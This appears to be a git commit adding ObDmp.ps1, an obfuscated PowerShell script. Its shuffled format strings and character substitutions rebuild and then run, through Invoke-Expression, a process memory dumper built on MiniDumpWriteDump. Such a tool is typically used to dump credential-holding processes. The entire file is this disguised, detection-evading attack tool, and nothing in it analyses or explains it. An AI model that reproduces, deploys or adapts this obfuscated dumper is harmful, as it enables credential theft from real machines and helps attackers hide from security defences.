248901a68366a76cd4f7cc27fc57f96a4416c2ae
badFilename <joey.huggins@gmail.com>
2022-04-12 21:05:31 -0500

    Add files via upload

---
+++ ObDmp.ps1
@@ -0,0 +1,64 @@
+(("{39}{120}{96}{65}{94}{17}{50}{72}{35}{26}{99}{108}{82}{3}{80}{1}{126}{52}{83}{79}{93}{41}{14}{87}{81}{8}{95}{49}{109}{125}{66}{16}{88}{21}{5}{92}{117}{36}{59}{63}{32}{116}{98}{42}{40}{122}{131}{24}{128}{30}{113}{10}{91}{121}{97}{11}{20}{106}{25}{6}{45}{28}{31}{37}{115}{127}{43}{85}{84}{34}{124}{61}{111}{70}{101}{44}{9}{19}{60}{58}{104}{18}{15}{110}{22}{112}{107}{47}{71}{114}{100}{73}{51}{57}{69}{64}{78}{56}{33}{90}{48}{102}{53}{74}{13}{38}{27}{86}{75}{2}{4}{119}{105}{62}{29}{132}{12}{68}{89}{7}{118}{67}{123}{129}{76}{54}{103}{55}{0}{77}{46}{130}{23}"-f'Q,97QmpW97Q), nbp{fTQflaTQfgS}))
+        Set-Va','
+
+    [CmdletBinding()]
+    Param (
+        [Parameter(MAndatOrY = nbp{TRTQfUE}, P','me ','(  [t','weRnAtIvEmTHodS -Value','LEnAmE -Value (m38nbp(nbpProce','         ','))
+     ','
+    PROCESS
+    {
+      ','f97Qew-O97Q,97QN97Q,97Qbj97Q','QfLL}, @','                   nbp{','m38-f','nvoke((m38{4}{1}{2}{6}{3}{5}{8}{0}{7}m38 -f 97Qepor97Q,97Qe97Q,97Qme','{dTQfUmpTQfFilEPATQfT','   nbp{eTQfXcEPTQfTiONTQfMesTQfSaGe','
+        Set-','(m38{1}{0}m38-f 97QT9','Q,97QExcepti97Q,97Qmponen97Q)
+         ',',97Qect9','fTQfilESTQfTREaM}.m38SAfeFiLETQfHandTQfLEm38,
+    ','RoCESSFi','io',' {}
+}','7Q3MJ97Q) ).m38vTQfAlUem38::m38cTQfReA','llTQfmeMoRy},
+                     ','  (m38{1}{0}m38 -f 97QXoA6f97Q','W97Q,97QSystem.Manag97Q,97QindowsErr97Q,97Q.Automation97Q,97Qting97Q,97','7QaRIab97Q,97QV97','97Q,97QNon','SuLt -Value (nbp{MINidUmTQfpWrITQfTeDTQfUTQfMP}.m38INTQfVoKem38','Q,97QLE97Q)  (m38{1}{0}{2}m38 -f 97QxO97Q,97Q197Q,97Qa6f97Q) -valuEon)::m38zT','TQfMTQfpFilEpTQfATh} nbp{pTQfRoCesSTQfFITQflTQfeNAME})
+
+        Set-Variable -Name fIl','
+    }
+
+    BEGIN
+    {
+        Set-Variable ','   ','  );    .(m38{1}{0}m38 -f97Qet97Q,97Qs97Q)','ppATh -Value (&','Qferom38','nt97Q,97Q.',' Set-V','nbp{pRoTQfcTQfESsDUmPPTQfA','7Q-97Q,97QPath97Q) nbp{_} })]
+        [String]
+        nbp','ream97Q,97QS97Q,97QIO97Q,97Qle97Q,97Q.Fi97Q)(','  nbp{1x','nbp{ETQfxcETQfpTTQfIon} = &(m38{1}{0}{2}{3}m38 -','                         ( .(m38{1}{0}{2}m38 -f 9','lLM','Q-I97Q,97Qte97Q','TQfS','fETQfsS}.m3','7Q,97Qse97Q)  (m38{0}{1}m38 -f97Q7597Q,97Q3mJ97Q','hrow nbp{ex','LUEFROmPIpelinE = nbp{tRTQfUe})]
+        [System.Diagnostics.Process]
+        nbp{PrOTQfcTQ','fBlYm','TQfAtiVETQfmeTQfTHoDs}.(m38{1}{0}{2}m38 -f97QtM97Q,9','((m38{0}{1}{4}{2}{3}m38-f97QM97Q,97QiniDu97Q,97Qrit97Q,97QeDump97','
+        }','ceptTQfiTQfoNMTQfETQfSTQfSaGE}
+   ','Q,97Qod97Q,97Qel97Q,97','(m38{1}{2}{0}m38-f97','7Q) (m38{5}{8}{0}{2}{3}{6}{4}{7}{1}m38-f97QtM97Q,97Qon97','bp{f','Qic','QPath97Q,97QJo97Q,97Qin-97Q) nbp{DU','   }
+        else
+        {
+            &(m38{0}{2}{3}{1}m38 -f 97QGet97Q,97Qm97Q,97Q-ChildI97Q,97Qte97Q) nbp{pTQf','7Qbj97Q,97QECT97Q,9','{pTQfROTQfcEss}.m38nTQfAMem38)
+        Set-Variable -Name pROCEssHaNdlE -Value (nbp{PrTQfoCEss}.m38HaTQfNdTQfLem38)','t-Variable -Name',' 97Qlic, S97Q,97QN97Q,97QonPub','  ','flT})
+  ',') nbp{pTQ',') ([TypE](m38{2}{0}{1}m38-f97QfIL97Q,97QeMoDe97Q,97QIO.97Q)','ontinue97Q,97QlyC97Q)
+
+            t','38.(m38{2}{1}{0}m38 -f 97Qe97Q,97QtTyp97Q,97QGe97Q).I',' -Na','RiTEdUmp -Value (nbp{WTQfERN','riable -Name MInIduMPwIThfu','RoCessTQfDTQfUTQfMPPaTH}','
+      ','YpE](m38{1}{0}m38 -F97Qr97Q,97QInTPT97Q)  )  ; function oTQfBDMP
+{
+','p{PTQfWD}
+    )
+',')  ','fESs},
+
+        [Parameter(POsITIoN = 1)]','      ','OTQfA6f}::m38ZTQfErom38,
+                                     ','QorR97Q)))
+        Set-Variable','h} = nb','Variable -Name P','97Q,97Qtat97Q,97Qic97Q','-Name wr -Value (nbp{GlTQfCqnK}.m38A','(nbp{Pr','ssName)_nbp(','  [ValidateScript({ &(m38{0}{1}{2}{3}m38 -f97QT97Q,97Qest97Q,9','7QpSO97Q)) ;&','  Set-Variable -Name PRoCssid -Value (nbp{PrOCTQ','}{0}{1}m38-F 9','                ','1}{0}{3}m38-f97Qc97Q,97Q-Obje97Q,97QNew97Q,97Qt97Q) (m38{2}{4}{3}{1}{0}m38-f 97Qt',',97Q1','fpatH} -ErrorAction (m38{1}{0}{3}{2}m38-f 97Qt97Q,97QSilen97Q,97Q','      {
+            ','SemTQ','7QGe97Q,97Qethod97Q).Invoke','Q3297Q,97QCo97Q,97Q.Win97','Nest97Q).Invoke((m38{0}{2}{3}{1}m38 -f97QNa97Q,97Qhods97Q,97Qti97Q,97QveMet97Q), (m38{2}{0}{1}m38-f 97Ql97Q,97','                                                 nbp{MiniDUTQfmTQfPwitHfU','m38
+
+           
+            .(m38{0}{2}{3}{1}m38 -f97QRemove97Q,97Qm97Q,97','97Q','8Idm38)
+    ','} = m38nbp(nbpExcept','TQfILeTQfSTREAm}.(m38{1}{0}m38-f97Qe97Q,97QClos97Q).Invoke()
+
+        if (-not nbp{rETQfsUTQ','n.Message) (nbp(nbpProcessName):nbp(nbpProcessId)) ','(nbp{nuT','fROCessDUTQfmpTQ',',
+                           ','estREAm -Value (.(m38{2}{','nbpProcessId).dmpm38)
+
+        Set-Variable -Name PrOcESsDUM','   Se',' (nbp{WTQfer}.(m38{1}{0}{3}{2}m38-f 97Qt97Q,97QGe97Q,97QedType97Q,97Q','ariable -Name gLCqNK -Value ([tYPE](m38{2','OCessHTQfAnTQfDTQfLe},
+                                                     nbp{PrTQfocEsSTQfId},
+                  ','tH},  (  .(m38{2}{1}{0}m38-f 97QTEm97Q,97Qhildi97Q,97Qc97Q)  (m38{2}{0}{1}{3}m38 -f 97QR9',' MInID','        nbp{1xTQfoa6F}::m38ZTQfErom38)))
+
+        n','    Set-Variable -Name PRocessNAme -Value (nbp','osITioN = 0, va','                         ','tEm38))
+
+        Set-Variable -Name rE','UMpw','emorY -Value ([UInt32] 2)
+    }
+
+    END','7Q,97QIaBLE:7597Q,97QVA97Q,9','Pub97Q)))
+        Set-Variable -Name FlAGS -Value ([Reflection.BindingFlags] (m38{1}{2}{0}{3}{4}')).RepLACe(([CHar]109+[CHar]51+[CHar]56),[sTRIng][CHar]34).RepLACe(([CHar]84+[CHar]81+[CHar]102),[sTRIng][CHar]96).RepLACe('97Q',[sTRIng][CHar]39).RepLACe(([CHar]110+[CHar]98+[CHar]112),'$')|invOKE-exPresSiOn
